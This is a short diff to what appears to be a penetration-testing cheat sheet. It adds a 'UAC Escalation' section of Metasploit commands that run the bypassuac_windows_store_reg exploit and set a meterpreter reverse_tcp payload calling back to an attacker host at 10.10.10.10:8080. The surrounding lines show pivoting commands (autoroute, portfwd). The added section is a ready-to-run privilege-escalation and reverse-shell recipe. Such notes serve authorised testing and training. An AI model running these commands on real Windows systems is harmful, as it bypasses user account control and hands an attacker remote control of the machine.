@@ -371,6 +371,17 @@ run autoroute -s 10.100.11.0/24
 Portfwd add -l <LOCAL PORT> -p <REMOTE PORT> -r <REMOTE HOST>
 ```
 
+### UAC Escalation
+
+```
+use exploit windows/local/bypassuac_windows_store_reg
+set payload windows/x64/meterpreter/reverse_tcp
+set LHOST 10.10.10.10
+set LPORT 8080
+set SESSION 2
+run
+```
+
 ### Change UAC to not Notify
 
 * Need to be admin
